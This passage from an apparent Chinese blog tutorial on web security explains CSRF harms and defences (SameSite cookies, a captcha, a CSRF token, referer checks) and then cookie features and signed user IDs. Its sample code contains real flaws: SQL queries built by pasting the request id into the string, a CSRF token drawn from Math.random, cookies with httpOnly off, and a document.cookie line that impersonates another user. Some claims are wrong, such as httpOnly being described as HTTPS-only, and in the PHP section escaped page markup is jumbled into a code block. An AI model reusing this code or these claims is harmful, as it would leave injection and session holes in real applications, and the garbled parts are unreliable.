CSRF攻击原理和危害</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501140628044.png" alt="image-20200501140628044"></p><p>csrf<strong>危害</strong></p><ul><li>利用用户登录态</li><li>用户不知情 </li><li>完成业务请求</li><li>盗取用户资金(转账、消费)</li><li>冒充用户发帖背锅</li><li>损坏网站名誉</li><li>…….</li></ul><h2 id="3-CSRF防御"><a href="#3-CSRF防御" class="headerlink" title="3 CSRF防御-"></a>3 CSRF防御-</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501144143209.png" alt="image-20200501144143209"></p><h3 id="措施"><a href="#措施" class="headerlink" title="措施"></a><strong>措施</strong></h3><ul><li><p>防御1——添加<code>sameSite</code>的value为<code>strict</code>.具体为在<code>controllers</code>中的<code>user.js</code>的<code>exports.doLogin = async function(ctx, next)&#123;</code>添加</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(results.length)&#123;</span><br><span class="line">            let user = results[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 登录成功，设置cookie</span></span><br><span class="line">            ctx.cookies.set(<span class="string">&#x27;userId&#x27;</span>, user.id, &#123;</span><br><span class="line">                httpOnly:<span class="literal">false</span>,</span><br><span class="line">                sameSite:<span class="string">&#x27;strict&#x27;</span>      <span class="comment">//添加的内容</span></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面说过：<strong>不访问A网站的前端</strong>，那么我们可以在前端进行验证信息呢？即 只有获得了前端特有的信息才算认证通过</p></li><li><p>防御2——在前端页面加入验证信息：有两种方案</p><ul><li>1、使用验证码：验证码需要前后端都要改造的，前端加入验证码的输入框，然后有一个对应的验证码，后端提供验证码，并记住是多少，下次当你提交的时候进行验证。因为csrf攻击不访问前端页面，也就无法获取到验证码，故而无法攻击完成。这里使用一个叫ccap 的生成验证码的模块，首先我们进行安装：<code>npm install ccap --registry=http://registry.npm.taobao.org --save</code>,然后在<code>site.js(routes)</code>中添加如下的代码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> site = <span class="keyword">require</span>(<span class="string">&#x27;../controllers/site&#x27;</span>);</span><br><span class="line"><span class="comment">// 添加的模块</span></span><br><span class="line"><span class="keyword">const</span> captcha = <span class="keyword">require</span>(<span class="string">&#x27;../tools/captcha&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加的</span></span><br><span class="line">router.get(<span class="string">&#x27;/captcha&#x27;</span>,captcha.captcha);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后新建一个<code>tools</code>文件，创建一个名为<code>captcha.js</code>,其内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> captcha =&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cache = &#123;&#125;;</span><br><span class="line">captcha.captcha = async <span class="function"><span class="keyword">function</span>(<span class="params">ctx,next</span>)</span>&#123;  <span class="comment">//生成验证码的函数</span></span><br><span class="line">    <span class="keyword">var</span> ccap = <span class="keyword">require</span>(<span class="string">&#x27;ccap&#x27;</span>);        <span class="comment">//模块引进</span></span><br><span class="line">    <span class="keyword">var</span> capt = ccap();                <span class="comment">//调用函数得到实例</span></span><br><span class="line">    <span class="keyword">var</span> data = capt.get();</span><br><span class="line">    </span><br><span class="line">    captcha.setCache(ctx.cookies.get(<span class="string">&#x27;userId&#x27;</span>,), data[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// data[0];                  //代表文本</span></span><br><span class="line">    ctx.body = data[<span class="number">1</span>];        <span class="comment">//代表验证码</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">captcha.setCache = <span class="function"><span class="keyword">function</span>(<span class="params">uid, data</span>)</span>&#123;</span><br><span class="line">    console.log(uid, data);</span><br><span class="line">    cache[uid] = data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断用户输入的验证码是否正确</span></span><br><span class="line">captcha.validCache = <span class="function"><span class="keyword">function</span>(<span class="params">uid, data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> cache[uid] === data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = captcha;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们需要在前端给验证码添加一个位置，故需要在<code>view下的post.pug</code>中添加如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//- .input-field</span></span><br><span class="line">                                                input(name=<span class="string">&quot;username&quot;</span>,placeholder=<span class="string">&quot;名字&quot;</span>)</span><br><span class="line">                                            .input-field</span><br><span class="line">                                                textarea(placeholder=&quot;内容&quot;,name=&quot;content&quot;,class=&quot;materialize-textarea&quot;)</span><br><span class="line">                                            .input-field  <span class="comment">//为添加的内容</span></span><br><span class="line">                                                input(name=<span class="string">&quot;captcha&quot;</span>,placeholder=<span class="string">&quot;验证码&quot;</span>)</span><br><span class="line">                                                img(src=<span class="string">&quot;/captcha&quot;</span>)</span><br><span class="line">                                            .input-field</span><br><span class="line">                                                button.waves-effect.waves-light.btn 发表</span><br></pre></td></tr></table></figure><p>前端输入的验证码内容我们要在后端进行一个验证，我们在<code>controllers中site.js</code>中的<code>addComment</code>里面添加如下的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">exports.addComment = async <span class="function"><span class="keyword">function</span>(<span class="params">ctx, next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> data;</span><br><span class="line">        <span class="keyword">if</span>(ctx.request.method.toLowerCase() ===<span class="string">&#x27;post&#x27;</span>)&#123;</span><br><span class="line">            data = ctx.request.body;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            data = ctx.request.query;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        console.log(data.captcha);</span><br><span class="line">        <span class="keyword">if</span>(!data.captcha)&#123;     <span class="comment">//如果验证码未提交，进行验证。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> captcha = <span class="keyword">require</span>(<span class="string">&#x27;../tools/captcha&#x27;</span>);    <span class="comment">// 引入模块</span></span><br><span class="line">        <span class="keyword">var</span> captchaResult = captcha.validCache(ctx.cookies.get(<span class="string">&#x27;userId&#x27;</span>), data.captcha);  <span class="comment">//验证</span></span><br><span class="line">        console.log(<span class="string">&#x27;result&#x27;</span>, captchaResult);</span><br><span class="line">        <span class="keyword">if</span>(!captchaResult)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>2、token（每次都输入验证码其实用户的体验感不是很好的）：攻击者直接发起请求的时候，无法获取该字符串，只有经过我们目标网站的前端才有可能获取到这个token。攻击者尝试攻击的时候，不会经过目标网站的前端，所以无法获取到token，从而导致请求失败（我们将之前写的那些验证码的代码删除掉）</p><p><code>第一步</code>:首先我们要生成<code>csrf-token</code>，其实这是一个随机的字符串，使用<code>Math.random（函数）</code>，得到token后，我们需要将其放在两个地方，一个在页面的表单中，第二个地方是我们的cookies中。这样后端第一步生成token后，并给到页面就完成了。一个给到页面的变量以便放到表单中，一个放在cookies。而cookie不需要页面关心，所以我们在<code>post.pug</code>页面中放一个表单。</p><p>在<code>controllers-site.js的post中</code>生成token并将其放到上述的两个位置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">exports.post = async <span class="function"><span class="keyword">function</span> (<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        console.log(<span class="string">&#x27;enter post&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//使用random来生成token（本质是随机的字符串），因为随机的范围是0~1，所以我们乘上一个比较大的数字，然后取整</span></span><br><span class="line">        <span class="keyword">var</span> csrfToken = parseInt(Math.random() * <span class="number">9999999</span>,<span class="number">10</span>);  </span><br><span class="line">        ctx.cookies.set(<span class="string">&#x27;csrfToken&#x27;</span>,csrfToken);   <span class="comment">// token放置的位置1：放在cookies中</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> id = ctx.params.id;</span><br><span class="line">        <span class="keyword">const</span> connection = connectionModel.getConnection();</span><br><span class="line">        <span class="keyword">const</span> query = bluebird.promisify(connection.query.bind(connection));</span><br><span class="line">        <span class="keyword">const</span> posts = await query(</span><br><span class="line">            `select * <span class="keyword">from</span> post where id = <span class="string">&quot;$&#123;id&#125;&quot;</span>`</span><br><span class="line">        );</span><br><span class="line">        let post = posts[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> comments = await query(</span><br><span class="line">            `select comment.*,user.username <span class="keyword">from</span> comment left join user on comment.userId = user.id where postId = <span class="string">&quot;$&#123;post.id&#125;&quot;</span> order by comment.createdAt desc`</span><br><span class="line">        );</span><br><span class="line">        comments.<span class="keyword">forEach</span>(<span class="function"><span class="keyword">function</span> (<span class="params">comment</span>) </span>&#123;</span><br><span class="line">            comment.content = xssFilter(comment.content);</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> (post) &#123;</span><br><span class="line">            ctx.render(<span class="string">&#x27;post&#x27;</span>, &#123;</span><br><span class="line">                post,</span><br><span class="line">                comments,          </span><br><span class="line">                csrfToken     <span class="comment">//token放置的位置2：在页面的表单中</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ctx.status = <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>post.pug</code>中表单设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//- .input-field</span></span><br><span class="line">                                                input(name=<span class="string">&quot;username&quot;</span>,placeholder=<span class="string">&quot;名字&quot;</span>)</span><br><span class="line">                                            .input-field</span><br><span class="line">                                                textarea(placeholder=&quot;内容&quot;,name=&quot;content&quot;,class=&quot;materialize-textarea&quot;)</span><br><span class="line">                                            .input-field</span><br><span class="line">                                                input(name=<span class="string">&quot;csrfToken&quot;</span>,value=csrfToken)   <span class="comment">//添加的内容</span></span><br><span class="line">                                            .input-field</span><br><span class="line">                                                button.waves-effect.waves-light.btn 发表</span><br></pre></td></tr></table></figure><p><code>第二步</code>：当第一步中csrf-token下发完成，并我们提交了内容后，我们第二步就需要<strong>校验</strong><code>cookies中csrf-token</code>和<code>表单中提交的csrf-token</code>是否一样.我们在<code>controller-site.js的addComment</code>中添加如下的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// ------此处为csrf-token代码校验部分</span></span><br><span class="line"><span class="comment">//判断传递过来的数据是否含有token</span></span><br><span class="line"><span class="keyword">if</span>(!data.csrfToken)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="built_in">Error</span>(<span class="string">&#x27;CSRF Token为空&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//判断传递的token 是否和cookies里面的token一致</span></span><br><span class="line"><span class="keyword">if</span>(data.csrfToken !== ctx.cookies.get(<span class="string">&#x27;csrfToken&#x27;</span>))&#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;CSRF Token错误&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501184123145.png" alt="image-20200501184123145"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501184225364.png" alt="image-20200501184225364"></p><p>如果表单和cookies中的一样就会通过，如下</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501184447651.png" alt="image-20200501184447651"></p></li></ul><p><strong>注意</strong>：如果是ajax请求如何获取该token呢？可以在<code>post.pug</code>表单中的<code>head</code>添加<code>meta(name=&quot;csrf_token&quot;, content=csrfToken)</code>，那么在网页的meta中会显示出来。于是我们在ajax请求之前可以通过js把meta中token的值取出来，然后发到后台。这样通过meta我们就可以获得到提交的值</p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501191158713.png" alt="image-20200501191158713"></p><p><strong>问题：</strong>用户打开了很多的页面和窗口，每打开一个会生成一个token，如果用户不在最后一个打开的页面中提交表单而是在之前的页面中进行提交，则会出现错误。因为每打开一个页面，就会生成一个token会将之前的产生的 给覆盖掉。这种问题该如何解决呢？</p><ul><li>防御3——<code>验证referer(正确的是referrer)</code>：禁止第三方网站的请求。我们将之前的<code>csrfToken</code>的相关东西删除掉    </li></ul><p>此时我们添加依据代码，然后添加一条评论，我们观察输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">exports.addComment = async <span class="function"><span class="keyword">function</span>(<span class="params">ctx, next</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> data;</span><br><span class="line">        <span class="keyword">if</span>(ctx.request.method.toLowerCase() ===<span class="string">&#x27;post&#x27;</span>)&#123;</span><br><span class="line">            data = ctx.request.body;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            data = ctx.request.query;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//--------添加部分-----------------  </span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> referer = ctx.request.headers.referer;<span class="comment">//取出referer</span></span><br><span class="line">        <span class="keyword">if</span>(!/^https?:\/\/localhost/.test(referer))&#123;   <span class="comment">//正则表达式更加安全</span></span><br><span class="line">        <span class="comment">// if(referer.indexOf(&#x27;localhost&#x27;)  === -1)&#123;    //只判断是否有localhost是不安全的，因为127。0.0.1:8090/csrf.html？content=localhost也是可以通过的，因为它含有了localhost这个字符，所以不安全</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;非法请求&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        console.log(ctx.request.headers);</span><br><span class="line"><span class="comment">//-----------------------------------</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501214219611.png" alt="image-20200501214219611"></p><h2 id="4-PHP-CSRF"><a href="#4-PHP-CSRF" class="headerlink" title="4  PHP-CSRF"></a>4  PHP-CSRF</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501221213804.png" alt="image-20200501221213804"></p><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200501221444977.png" alt="image-20200501221444977"></p><ul><li><p>1 <code>cookie samesite</code>属性：<code>header(&#39;Set-Cookie: test=12345; SameSite=Lax&#39;);</code></p></li><li><p>2<code> HTTP referer头</code>：首先获取到该referer头，第二如何进行判断</p><ul><li><pre><code class="php">if($_SERVER[&#39;HTTP_REFERER&#39;])&#123;    $isLegal = strpos($_SERVER[&#39;HTTP_REFERER&#39;], &#39;http://websecurity.local/&#39;) === 0 ;    var_dump($isLegal);&#125;&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 3 &amp;#96;token&amp;#96;：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 3 前端cookies问题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;## 1 cookies特性&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 前端数据存储&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 后端通过HTTP头设置&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 请求时通过HTTP头传给后端&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 前端可读写&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 遵守同源策略&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cookie是有结构的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 域名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 有效期&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 路径（url层级）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96;http-only&amp;#96;：表示只能被https协议使用，可以在请求和发送中使用cookie，而此时JavaScript是不能使用的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96;secure&amp;#96;：表示cookies只能在https的网站汇中使用，在http协议中无法使用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96;samesite&amp;#96;：表示第三方网站的请求是否可以使用cookies（目前好像只有Chrome中支持samesite）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96;session&amp;#96;：表示会话，一般其关闭页面即消失。我们可以使用Expires（删除cookie是用这个来操作的，即设置为过期时间）来设置session存在的时间&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#96;&amp;#96;&amp;#96;php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F; 后端使用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ctx.cookies.set(&amp;#39;userId&amp;#39;, user.id, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                httpOnly:false,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                sameSite:&amp;#39;strict&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;&amp;#x2F; 前端使用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;document.cookie     &amp;#x2F;&amp;#x2F;能够获取cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;document.cookie &amp;#x3D; &amp;#39;value&amp;#39;    &amp;#x2F;&amp;#x2F;设置cookie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre></li></ul></li></ul><h2 id="2-cookies作用"><a href="#2-cookies作用" class="headerlink" title="2 cookies作用"></a>2 cookies作用</h2><p>其作用有以下方面</p><ul><li>存储个性化设置</li><li>存储未登录时用户唯一标识（虽然我不知道你是谁，但是我知道你是那个人）</li><li>存储已登录用户的凭证</li><li>存储其他业务数据（缓存数据等）</li></ul><p><strong>如何写用户的凭证</strong></p><ul><li>用户id（能够被篡改，如果之前cookies中userID=1，我把它篡改为userID=2，此时如果我评论的话，将是以用户2的身份评论的）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">            登录成功，设置cookie</span><br><span class="line">            ctx.cookies.set(<span class="string">&#x27;userId&#x27;</span>, user.id, &#123;</span><br><span class="line">                httpOnly:<span class="literal">false</span>,</span><br><span class="line">                sameSite:<span class="string">&#x27;strict&#x27;</span></span><br><span class="line">            &#125;);</span><br><span class="line"><span class="comment">//在开发者工具中，我们这样写，加入之前的UserId=1（正常用户）</span></span><br><span class="line">document.cookie=<span class="string">&quot;userId=2&quot;</span>;   <span class="comment">//我们将cookie设置为userId=2(黑客用户)，如果我们此时评论的话，将会用用户2的身份评论</span></span><br></pre></td></tr></table></figure><ul><li>用户ID+签名（保证这个签名只有我能够算出来，其他人算不出来）</li></ul><p>去登陆的地方把userID换掉，即在user.js中将使用用户id的那段cookies设置方法换成如下的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模块的引入</span></span><br><span class="line"><span class="keyword">const</span> crypt = <span class="keyword">require</span>(<span class="string">&#x27;../tools/crypt.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录成功，设置cookie</span></span><br><span class="line">            ctx.cookies.set(<span class="string">&#x27;userId&#x27;</span>, crypt.cryptUserId(user.id), &#123;</span><br><span class="line">                httpOnly:<span class="literal">false</span>,</span><br><span class="line">                sameSite:<span class="string">&#x27;strict&#x27;</span></span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure><p>此时登录之后，userID的value将是一个字符串，但是此时有一个<strong>问题</strong>：当我把这个值带到后台后，后台该如何知道他是谁？</p><p><code>签名</code>：是一个不可逆的算法，即不可能通过签名的值倒推出签名的明文是多少</p><p>所以我们需要做一件事，就是将明文透出来，修改如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录成功，设置cookie</span></span><br><span class="line">ctx.cookies.set(<span class="string">&#x27;sign&#x27;</span>, crypt.cryptUserId(user.id), &#123;</span><br><span class="line">    httpOnly:<span class="literal">false</span>,</span><br><span class="line">    sameSite:<span class="string">&#x27;strict&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">         ctx.cookies.set(<span class="string">&#x27;userId&#x27;</span>, 